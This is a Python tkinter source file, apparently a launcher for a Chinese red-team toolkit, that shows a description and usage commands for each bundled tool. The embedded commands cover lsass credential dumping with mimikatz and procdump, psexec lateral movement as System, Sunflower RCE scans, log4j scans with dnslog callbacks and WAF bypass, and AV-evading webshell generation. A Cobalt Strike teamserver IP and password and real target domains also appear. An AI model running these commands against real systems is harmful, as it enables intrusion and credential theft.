        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # shiro
    elif name == "shiro":
        file_path = r"file\shiro"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "shiro介绍：\n四个工具检测shiro漏洞\n\n"
                         "使用方法：\n打开文件夹"
                         "\n\n注：内存马注入必须为存在的文件")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # suscan
    elif name == "suscan":
        file_path = r"file\suscan\wxappUnpacker-master"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "suscan介绍：\n小程序资产处理\n\n"
                         "使用方法：\n打开文件夹")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python SuScan.py":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python SuScan.py""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}\result".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # asset_deal
    elif name == "asset_deal":
        file_path = r"file\asset_deal"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "asset_deal介绍：\n查看资产处理\n\n"
                         "使用方法：\n打开文件夹")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开asset_deal", font=("宋体", 15),
                            command=lambda: open_cmd_window(file_path + " && asset_deal_personal_1.5.exe && exit"))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # Finger_ws
    elif name == "Finger_ws":
        file_path = r"file\Finger_ws"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "Finger_ws介绍：\n由ws魔改的finger\n\n"
                         "使用方法：\npython Finger_w.py -f 1.txt -o xslx")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "python Finger_w.py -f 1.txt -o xslx":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """python Finger_w.py -f 1.txt -o xslx""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开CMD", font=("宋体", 15), command=lambda: open_cmd_window(file_path))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}\output".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)


    # railgun-1.4.6
    elif name == "railgun":
        file_path = r"file\railgun-1.4.6"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "railgun-1.4.6介绍：\n由***大神制作的漏洞扫描利用工具\n\n"
                         "使用方法：\n打开文件夹点击文件，密码三个空格")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开railgun", font=("宋体", 15),
                            command=lambda: open_cmd_window(file_path + "&& gorailgun-1.4.6.exe && exit"))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # goby
    elif name == "goby":
        file_path = r"file\goby-win-x64-2.0.1"
        text.insert(tk.INSERT, name + "位置在：{}\n".format(
            file_path) + "goby介绍：\n漏扫工具\n\n"
                         "使用方法：\n打开程序")
        # 使用命令
        if text1.get("1.0",
                     tk.END).strip() != "无":
            text1.delete("1.0", tk.END)
            text1.insert(tk.INSERT,
                         """无""".format(
                             file_path))
        # 按钮功能
        # 写入文件
        Button1 = tk.Button(root, text="写入文件", font=("宋体", 15), command=lambda: wrint_in(name=file_path + r"\1.txt"))
        Button1.place(relx=0.2, rely=0.61, relwidth=0.2, relheight=0.06)

        # 复制命令
        Button2 = tk.Button(root, text="复制命令", font=("宋体", 15), command=copy_to_clipboard)
        Button2.place(relx=0.4, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开cmd窗口
        Button3 = tk.Button(root, text="打开goby", font=("宋体", 15),
                            command=lambda: open_cmd_window(file_path + "&& goby.exe && exit"))
        Button3.place(relx=0.6, rely=0.61, relwidth=0.2, relheight=0.06)

        # 打开结果文件夹必须要绝对路径
        result_path = os.getcwd() + r"\{}".format(file_path)
        Button4 = tk.Button(root, text="打开结果文件夹", font=("宋体", 15), command=lambda: open_dirctory(result_path))
        Button4.place(relx=0.8, rely=0.61, relwidth=0.2, relheight=0.06)

    # frp_windows
    elif name == "frp_windows":
        buju(file_path="frp_windows", tool_name="frp_windows", tool_introduce="frp_windows是一款强大的windows代理工具",
             tool_usage_method="服务端运行frps：\n"
                               "被控端运行frpc：\n"
                               "绝对路径和配置文件都需要指定绝对路径", tool_use_commond="./frps -c frps.ini\n"
                                                                      "被控端运行：绝对路径程序 -c 配置文件绝对路径",
             run_cmd=r"file\frp_windows")

    # frp_linux
    elif name == "frp_linux":
        buju(file_path="frp_linux", tool_name="frp_linux", tool_introduce="frp_linux是一款强大的linux代理工具",
             tool_usage_method="自行摸索", tool_use_commond="自行摸索", run_cmd=r"file\frp_linux")

    # Neo-reGeorg
    elif name == "Neo-reGeorg":
        buju(file_path="Neo-reGeorg", tool_name="Neo-reGeorg", tool_introduce="Neo-reGeorg是一款强大的正向代理工具",
             tool_usage_method="生成命令：python neoreg.py generate -k <you_password>\n"
                               "上传文件：python neoreg.py  -k <you_password> -u <server_url>", tool_use_commond="自行摸索",
             run_cmd=r"file\Neo-reGeorg")

    # liqun(内部1.5.5)
    elif name == "liqun(内部1.5.5)":
        buju(file_path="liqun", tool_name="liqun",
             tool_introduce="liqun是一款强大的漏洞利用工具\n包含各大OA，thinkphp，strtus，weblogic等常见利用工具", tool_usage_method="打开文件夹进行利用",
             tool_use_commond="自行摸索", run_cmd=r"file\liqun")

    # liqun1.5.1
    elif name == "liqun1.5.1":
        buju(file_path="LiqunKit_1.5.1", tool_name="liqun1.5.1",
             tool_introduce="liqun1.5.1是一款强大的漏洞利用工具\n包含各大OA，thinkphp，strtus，weblogic等常见利用工具",
             tool_usage_method="打开文件夹进行利用", tool_use_commond="自行摸索", run_cmd=r"file\LiqunKit_1.5.1")

    # apt_t00ls
    elif name == "apt_t00ls":
        buju(file_path="apt", tool_name="apt",
             tool_introduce="apt_t00ls是一款强大的漏洞利用工具，高危及以上漏洞\n包含OA：泛微、致远、蓝凌、万户、帆软、用友、通达"
                            "\n安全设备：海康综合安防、H3C cas_cvm 云计算管理、网御星云上网行为管理账号密码泄露、奇安信网康防火墙 RCE"
                            "\n中间件：IIS put shell"
                            "\ncms:nacos 任意用户添加",
             tool_usage_method="打开文件夹进行利用", tool_use_commond="自行摸索", run_cmd=r"file\apt")

    # Thelostworld OA
    elif name == "Thelostworld OA":
        buju(file_path="Thelostworld_OA", tool_name="Thelostworld OA",
             tool_introduce="Thelostworld OA是一款OA相关漏洞利用工具\n包含各大OA相关利用", tool_usage_method="打开文件夹进行利用",
             tool_use_commond="自行摸索", run_cmd=r"file\Thelostworld_OA")

    # 冰蝎
    elif name == "冰蝎":
        buju(file_path="Behinder", tool_name="冰蝎", tool_introduce="冰蝎是一款webshell管理工具\n管理webshell",
             tool_usage_method="打开文件夹进行利用", tool_use_commond="自行摸索", run_cmd=r"file\Behinder")

    # 哥斯拉
    elif name == "哥斯拉":
        buju(file_path="godzilla", tool_name="哥斯拉", tool_introduce="哥斯拉是一款webshell管理工具\n管理webshell",
             tool_usage_method="打开文件夹进行利用", tool_use_commond="自行摸索", run_cmd=r"file\godzilla")

    # 蚁剑
    elif name == "蚁剑":
        buju(file_path="AntSword", tool_name="蚁剑", tool_introduce="蚁剑是一款webshell管理工具\n管理webshell",
             tool_usage_method="打开文件夹进行利用", tool_use_commond="自行摸索", run_cmd=r"file\AntSword")

    # 内网工具 fscan
    elif name == "fscan":
        buju(file_path="fscan", tool_name="fscan",
             tool_introduce="fscan:\n是一款综合内网漏洞扫描域信息收集工具\n内网漏洞扫描与信息收集"
                            "\n -t 默认线程600 -hf ip.txt"
                            "\n新增Xscan 有一定程度的免杀能力\n"
                            "",
             tool_usage_method="上传至主机进行扫描",
             tool_use_commond="fscan64.exe -hf 1.txt  -o result.txt -p 1-65535",
             run_cmd=r"file\fscan")

    # 内网工具 cobaltstrike
    elif name == "cobaltstrike":
        buju(file_path="cobaltstrike", tool_name="cobaltstrike",
             tool_introduce="""
                                    cobaltstrike是一款综合内网渗透是好用的工具
                                    内网横向，反弹等操作
                                    包含cs4.2,4.3,4.4,4.7
                                    """,
             tool_usage_method="开启cs服务端：  ./teamserver  39.96.57.98  suchangyu\njava -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar",
             tool_use_commond="java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar",
             run_cmd=r"file\cobaltstrike")


    # 内网连接 MDUT
    elif name == "Multiple.Database.Utilization.Tools-2.1.1":
        buju(file_path="Multiple.Database.Utilization.Tools-2.1.1",
             tool_name="Multiple.Database.Utilization.Tools-2.1.1",
             tool_introduce="Multiple.Database.Utilization.Tools-2.1.1是一款综合数据库连接的工具\n各种数据库连接操作",
             tool_usage_method="java -jar Multiple.Database.Utilization.Tools-2.1.1.jar",
             tool_use_commond="java -jar Multiple.Database.Utilization.Tools-2.1.1.jar",
             run_cmd=r"file\Multiple.Database.Utilization.Tools-2.1.1")

    # ew
    elif name == "ew":
        buju(file_path="ew-master", tool_name="ew-master", tool_introduce="ew-master是一款流量代理工具\n流量代理",
             tool_usage_method="本地转发：\new_for_win.exe -s ssocksd -l 9999",
             tool_use_commond="ew_for_win.exe -s ssocksd -l 9999", run_cmd=r"file\ew-master")

    # 针对性字典生成
    elif name == "针对性字典生成":
        buju(file_path="Dic_fist", tool_name="Dic_fist", tool_introduce="Dic_fist是一款针对存在能爆破的登录页面针对性字典生成\n有用户名枚举效率更高",
             tool_usage_method="使用命令：\npython 密码猜解_GUI.py", tool_use_commond="python 密码猜解_GUI.py",
             run_cmd=r"file\Dic_fist")

    # 横向工具
    elif name == "psexec":
        # file_path打开文件夹
        buju(file_path="psexec", tool_name="psexec",
             tool_introduce="微软官方工具，可以用来横向，远程执行命令，远程运行文件\n在内网横向中可以通过smb共享隧道，用代理服务器作为中转监听，IPC共享隧道远程执行命令等进行上线",
             tool_usage_method="使用方法及参数介绍：\n获取 PsExec64.exe -accepteula \\\\192.168.108.101 -s cmd.exe  然后再使用cs生成中转\n相关参数介绍:\n -accepteula是指第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框。"
                               "\n -s是指以System权限运行远程进程，获得一个System权限的交互式Shell。如果不使用该参数，会获得一个Administrator权限的shell。"
                               "\n -c是Administrator 权限运行远程进程，运行完毕后会在远程服务器上删除可执行文件",
             tool_use_commond="PsExec64.exe -accepteula \\\\192.168.108.101 -s cmd.exe  ",
             run_cmd=r"file\psexec\PSTools")

    # 存活探测
    elif name == "naabu":
        # file_path打开文件夹
        buju(file_path="naabu", tool_name="naabu",
             tool_introduce="一款强大的扫描工具：\n-c 指定线程，默认25\n-p 1-10000\n-rate 每秒最大发包数\n-o txt输出\n-csv csv格式输出\n更多参数详情请使用 -h 来显示"
                            "\n-exclude-cdn 域名解析为CDN地址时不进行扫描，仅仅扫描80,443",
             tool_usage_method="naabu.exe -l 1.txt  -p 1-65535  -o result.txt  -exclude-cdn ",
             tool_use_commond="naabu.exe -l 1.txt  -p 1-65535  -o result.txt -exclude-cdn  -c 100 -retries 1 -timeout 500 ",
             run_cmd=r"file\naabu")

    # 存活探测
    elif name == "ffuf":
        # file_path打开文件夹
        buju(file_path="ffuf", tool_name="ffuf", tool_introduce="""
                    ffuf是一款模糊探测工具：
                    具有子域名爆破
                    密码爆破（不推荐，使用burp）
                    接口爆破
                    使用各种 HTTP 方法进行模糊测试，例如IIS的put文件上传""", tool_usage_method="""
                    目录扫描
                    ffuf -u "http://192.168.242.62/dvwa/FUZZ"  -w ./top7000.txt -of csv -o 1.csv
                    子域名爆破（对单个子域名进行爆破）
                    ffuf -w subdomains.txt -u http://website.com/ -H "Host:FUZZ.website.com" ./top7000.txt -of csv -o 1.csv
                    接口爆破（对单个子域名进行爆破）""",
             tool_use_commond='ffuf -u "http://192.168.242.62/dvwa/FUZZ"  -w ./top7000.txt -of csv -o 1.csv',
             run_cmd=r"file\ffuf")  # 存活探测

    elif name == "katana":
        # file_path打开文件夹
        buju(file_path="katana", tool_name="katana", tool_introduce="""
                    katana 是一款渗透测试中的爬虫工具：
                    能探测黑链，提取网页中的隐藏路径
                   """, tool_usage_method="""
                    -d 爬取的最大深度，默认为2
                    -ct 网站爬取的最大时间 默认不开启
                    -aff 启用自动表单填充，默认不开启
                    -proxy http://127.0.0.1:8080
                    -retry 重试，默认为1
                    -ef  给定扩展刷选输出，js,css,html
                    -c   指定线程，默认为10
                    -rl  指订每秒最大请求，默认为150
                    -rlm 指定每分钟最大请求 默认不开启
                    -nc  不开启颜色输出
                    -jc  js文件中爬取路径 默认不开启
                    更多细节请使用 katana.exe -h
                    katana.exe -list 1.txt  -ct 600 -d 3 -jc -o result.txt""",
             tool_use_commond='katana.exe -list 1.txt  -ct 600 -d 3 -jc -o result.txt', run_cmd=r"file\katana")

    # 向日葵RCE
    elif name == "向日葵RCE":
        # file_path打开文件夹
        buju(file_path="向日葵RCE", tool_name="向日葵RCE", tool_introduce=
        """
        搜集了两款向日葵利用工具
        一般来说端口大于40000
        直接访问出现{"success":false,"msg":"Verification failure"}字段可能存在向日葵RCE漏洞
        """, tool_usage_method=
             """
             打开图形化利用工具直接利用
             批量扫描
             xrkRcePro.exe -h 172.16.50.100/24 -p 40000-65535 -c "whoami" -t rce
             单个扫描
             xrkRcePro.exe -h 172.16.50.100 -p 49843 -c "whoami" -t rce
               -c string
                     指定命令
               -h string
                     支持IP（x.x.x.x）  网段(x.x.x.0/24)
               -p string
                     指定端口 (default "1-65535")
               -t string
                     指定类型：scan rce (default "scan")
               -x int
                     检测速度 (default 2000)
             """,
             tool_use_commond='xrkRcePro.exe -h 172.16.50.100 -p 49843 -c "whoami" -t rce', run_cmd=r"file\向日葵RCE")


    # JsInfo-Scan
    elif name == "JsInfo-Scan":
        # file_path打开文件夹
        buju(file_path="JsInfo-Scan", tool_name="JsInfo-Scan", tool_introduce=
        """
        从js中收集根域名，密码，邮箱，ip，作者信息等
        """, tool_usage_method=
             """
             建议在服务器上运行
             关键字可填写多个,黑名单可选
             1.txt中填写根域名
             python jsinfo.py --target 1.txt --keywords  *,* --black_keywords *,*（可选）
             """,
             tool_use_commond='python jsinfo.py --target 1.txt --keywords  *,*', run_cmd=r"file\JsInfo-Scan")

    # theHarvester
    elif name == "theHarvester":
        # file_path打开文件夹
        buju(file_path="theHarvester", tool_name="theHarvester", tool_introduce=
        """
        从搜索引擎中找子域名和邮箱
        """, tool_usage_method=
             """
             使用命令：
             python theHarvester.py -d cpic.com.cn -b baidu
             python theHarvester.py -d cpic.com.cn -b bing
             """,
             tool_use_commond='python theHarvester.py -d cpic.com.cn -b bing', run_cmd=r"file\theHarvester")

    # fofaviewer
    elif name == "fofaviewer":
        # file_path打开文件夹
        buju(file_path="fofaviewer", tool_name="fofaviewer", tool_introduce=
        """
        fofa客户端
        """, tool_usage_method=
             """
             使用命令：
             java -jar fofaviewer.jar
             直接打开也可以
             后续fofa语法
             """,
             tool_use_commond='java -jar fofaviewer.jar', run_cmd=r"file\fofaviewer")

    # dontgo403
    elif name == "dontgo403":
        # file_path打开文件夹
        buju(file_path="dontgo403", tool_name="dontgo403", tool_introduce=
        """
        dontgo403
        bypass 40x 工具
        """, tool_usage_method=
             """
             使用命令：
             dontgo403_windows_amd64.exe -u url
             """,
             tool_use_commond='dontgo403_windows_amd64.exe -u url', run_cmd=r"file\dontgo403")

    # DNSdb
    elif name == "DNSub":
        # file_path打开文件夹
        buju(file_path="DNSub", tool_name="DNSub", tool_introduce=
        """
        DNSub：
        子域名爆破收集工具
        """, tool_usage_method=
             """
             使用命令：
             dnsub_windows_amd64.exe -domain--file 1.txt -o csv
             """,
             tool_use_commond='dnsub_windows_amd64.exe -domain--file 1.txt -o csv', run_cmd=r"file\DNSub")

    # XSStrike
    elif name == "XSStrike":
        # file_path打开文件夹
        buju(file_path="XSStrike", tool_name="XSStrike", tool_introduce=
        """
        XSStrike：
        xss检测工具：项目地址
        https://github.com/s0md3v/XSStrike
        """, tool_usage_method=
             """
             使用命令：
             python xsstrike.py -u url
             参数介绍
             -l 是检测水平1~未知，检测强度逐级递增
             --fuzzer              fuzzer
             --update              更新
             """,
             tool_use_commond='python xsstrike.py -u http://peixun.hnu.edu.cn/index.htm --params --crawl -l 4',
             run_cmd=r"file\XSStrike")

    # CF
    elif name == "CF":
        # file_path打开文件夹
        buju(file_path="CF", tool_name="CF", tool_introduce=
        """
        云存储秘钥利用
        项目地址
        https://github.com/teamssix/cf/releases/tag/v0.4.4
        """, tool_usage_method=
             """
             设置云存储秘钥
             cf.exe config
               about        关于作者 (About me)
               alibaba      执行与阿里云相关的操作 (Perform Alibaba Cloud related operations)
               aws          执行与 AWS 相关的操作 (Perform AWS related operations)
               config       配置云服务商的访问密钥 (Configure cloud provider access key)
               help         Help about any command
               huawei       执行与华为云相关的操作 (Perform Huawei Cloud related operations)
               tencent      执行与腾讯云相关的操作 (Perform Tencent Cloud related operations)
               upgrade      更新 cf 到最新版本 (Update cf to the latest version)
               version      输出 cf 的版本和更新时间 (Print the version number and update time of cf)
             开始利用
             cf.exe  alibaba 
               console      一键接管控制台 (Takeover console)
               ecs          执行与弹性计算服务相关的操作 (Perform ecs-related operations)
               ls           一键列出当前凭证下的 OSS、ECS、RDS 资源 (List OSS, ECS, RDS resources)
               oss          执行与对象存储相关的操作 (Perform oss-related operations)
               perm         列出当前凭证下所拥有的权限 (List access key permissions)
               rds          执行与云数据库相关的操作 (Perform rds-related operations)
               regions      列出可用区域 (List available regions)
             """,
             tool_use_commond='cf.exe config', run_cmd=r"file\CF")

    # 白鹿社工字典
    elif name == "白鹿社工字典":
        # file_path打开文件夹
        buju(file_path="白鹿社工字典", tool_name="白鹿社工字典", tool_introduce=
        """
        白鹿社工字典，针对生成社工字典
        """, tool_usage_method=
             """
             白鹿社工字典
             字典规则，增加
             密码
             姓名@公司主域名；，
             公司简称+工号（白鹿字典生成工具利用）
             """,
             tool_use_commond='打开文件夹利用 ', run_cmd=r"file\白鹿社工字典")

    # mimikatz
    elif name == "mimikatz":
        # file_path打开文件夹
        buju(file_path="mimikatz", tool_name="mimikatz", tool_introduce=
        """
        mimikatz:
        windows下的密码抓取工具
        """, tool_usage_method=
             """
             本地解密：mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt 
             远程解密：mimikatz.exe "privilege::debug "sekurlsa::logonpasswords full" exit >> pass.txt
             注：lsass.dmp dump下来的文件
             """,
             tool_use_commond='mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt ',
             run_cmd=r"file\mimikatz")

    # procdump
    elif name == "procdump":
        # file_path打开文件夹
        buju(file_path="procdump", tool_name="procdump", tool_introduce=
        """
        procdump:
        微软官方的hash抓取工具 
        procdump.exe -accepteula -ma lsass.exe lsass.dmp
        """, tool_usage_method=
             """
             procdump.exe -accepteula -ma lsass.exe lsass.dmp
             """,
             tool_use_commond='procdump.exe -accepteula -ma lsass.exe lsass.dmp', run_cmd=r"file\procdump")

    # Outflank-Dumpert
    elif name == "Outflank-Dumpert":
        # file_path打开文件夹
        buju(file_path="Outflank-Dumpert", tool_name="Outflank-Dumpert", tool_introduce=
        """
        Outflank-Dumpert:
        白嫖到的一款windwos hash密码抓取工具，具有免杀效果，抓取hash后本地执行hash解密
        使用方法，直接运行，注意上传时修改名字
        """, tool_usage_method=
             """
             上传到目标文件直接运行
             """,
             tool_use_commond='上传到目标文件直接运行', run_cmd=r"file\Outflank-Dumpert")

    # reGeorg-master
    elif name == "reGeorg":
        # file_path打开文件夹
        buju(file_path="reGeorg", tool_name="reGeorg", tool_introduce=
        """
        reGeorg:
        一款正向代理工具，使用python2开发，可以使用shiro工具内存马做正向代理
        例如
        reGeorg[Servlet]
        NeoreGeorg[Servlet]
        """, tool_usage_method=
             """
             1、shiro工具注入内存马
             2、本地：python2 reGeorgSocksProxy.py -u url -p 8081
             3、proxifer将流量代理到8081端口
             """,
             tool_use_commond='python2 reGeorgSocksProxy.py -u url -p 8081', run_cmd=r"file\reGeorg-master")



    # JSFinder
    elif name == "JSFinder":
        # file_path打开文件夹
        buju(file_path=r"JSFinder", tool_name="JSFinder", tool_introduce=
        """
        JSFinder:
        使用场景：
        登录处，或者是大页面
        获取目标包含在js中的所有URL
        """, tool_usage_method=
             """
             注：写入url产生的方式为追加写入
             python JSFinder.py -f 1.txt -ou urls.txt -os subdomain.txt
             """,
             tool_use_commond='python JSFinder.py -f 1.txt -ou urls.txt -os subdomain.txt', run_cmd=r"file\JSFinder")

    # URLFinder
    elif name == "URLFinder":
        # file_path打开文件夹
        buju(file_path=r"URLFinder", tool_name="URLFinder", tool_introduce=
        """
        URLFinder:
        获取目标包含在js中的所有URL
        使用场景：
        用于hw中获取敏感信息
        用于src挖掘验证
        用于渗透测试
        能抓取url，后台信息验证
        -s 指定需要的类型，在大型hw中，建议指定200
        -b string
            set baseurl
            设置baseurl路径
        -m int
            set mode
            抓取模式
               1 normal
                 正常抓取（默认）
               2 thorough
                 深入抓取 （url深入一层,js深入三层，防止抓偏）
               3 security
                 安全深入抓取（过滤delete，remove等敏感路由）
        -z int
            set Fuzz
            对404链接进行fuzz(只对主域名下的链接生效,需要与-s一起使用）
               1 decreasing
                 目录递减fuzz
               2 2combination
                 2级目录组合fuzz（适合少量链接使用）
               3 3combination
                 3级目录组合fuzz（适合少量链接使用）
        """, tool_usage_method=
             """
             注：写入url方式为追加写入
             hw：URLFinder-windows-386.exe -f 1.txt -o .  -s 200,403,404  -m 2 目录FUZZ用识魔
             SRC挖掘：URLFinder-windows-386.exe -f 1.txt -o . -s 200,403 -m 2 -z 2            必须保证目标准确 
             渗透测试（单个url）：URLFinder-windows-386.exe -f 1.txt -o .  -s all -z 1
             后台：保证安全
             URLFinder-windows-386.exe -f 1.txt -o . -s all -m 3
             """,
             tool_use_commond='URLFinder-windows-386.exe -f 1.txt -o .  -s all -m 2', run_cmd=r"file\URLFinder")



    # log4j
    elif name == "log4j":
        # file_path打开文件夹
        buju(file_path=r"log4j", tool_name="log4j", tool_introduce=
        """
        log4j:
        对log4j漏洞进行扫描
        使用方式
            python log4j-scan.py -l 1.txt --test-CVE-2021-45046 --dns-callback-provider 0ud8z2.dnslog.cn
            python log4j-scan.py -l 1.txt --test-CVE-2022-42889 --dns-callback-provider 0ud8z2.dnslog.cn
        """, tool_usage_method=
             """
             python log4j-scan.py -l 1.txt --test-CVE-2021-45046 --dns-callback-provider 0ud8z2.dnslog.cn
             python log4j-scan.py -l 1.txt --test-CVE-2022-42889 --dns-callback-provider 0ud8z2.dnslog.cn
             """,
             tool_use_commond='python log4j-scan.py -l 1.txt --test-CVE-2021-45046 --custom-dns-callback-host yoigs7.dnslog.cn --dns-callback-provider dnslog.cn --waf-bypass',
             run_cmd=r"file\log4j")

    # SmallProxyPool
    elif name == "SmallProxyPool":
        # file_path打开文件夹
        buju(file_path=r"SmallProxyPool", tool_name="SmallProxyPool", tool_introduce=
        """
        SmallProxyPool:
        使用场景：
            HW中或者SRC挖掘中IP被封的解决方案
        """, tool_usage_method=
             """
             打开CMD，运行SmallProxyPool,BURP连接至该代理上
             """,
             tool_use_commond='smallProxyPool_windows', run_cmd=r"file\SmallProxyPool")

    # Forest
    elif name == "Forest":
        # file_path打开文件夹
        buju(file_path=r"Forest", tool_name="Forest", tool_introduce=
        """
        Forest:
        使用场景：
            适用于隐藏自己地址，过waf代理，哥斯拉内存加载frpc
        """, tool_usage_method=
             """
             详细情况参考自己笔记：
             frp内存加载baypass 360
             """,
             tool_use_commond='暂无', run_cmd=r"file\Forest")

    # Webshell_Generate-1.2.1
    elif name == "Webshell_Generate":
        # file_path打开文件夹
        buju(file_path=r"Webshell_Generate-1.2.1", tool_name="Webshell_Generate", tool_introduce=
        """
        Webshell_Generate:
        使用场景：
            生成免杀木马
        """, tool_usage_method=
             """
             打开Webshell_Generate
             """,
             tool_use_commond='暂无', run_cmd=r"file\Webshell_Generate-1.2.1")

    # 免杀的webshell
    elif name == "免杀的webshell":
        # file_path打开文件夹
        buju(file_path=r"免杀的webshell", tool_name="免杀的webshell", tool_introduce=
        """
        免杀的webshell:
        使用场景：
            直接找免杀的木马
        """, tool_usage_method=
             """
             打开免杀的webshell
             """,
             tool_use_commond='暂无', run_cmd=r"file\免杀的webshell")

    # 免杀的webshell
    elif name == "SRC挖掘":
        # file_path打开文件夹
        buju(file_path=r"SRC挖掘", tool_name="SRC挖掘", tool_introduce=
        """
        SRC挖掘:
        使用场景：
            SRC挖掘管理
        """, tool_usage_method=
             """
             SRC挖掘
             """,
             tool_use_commond='暂无', run_cmd=r"file\SRC挖掘")

    # CheckList&成果
    elif name == "CheckList&成果":
        # file_path打开文件夹
        buju(file_path=r"CheckList", tool_name="CheckList&成果", tool_introduce=
        """
        CheckList&成果:
        使用场景：
            CheckList&成果 检查项
        """, tool_usage_method=
             """
             CheckList&成果
             """,
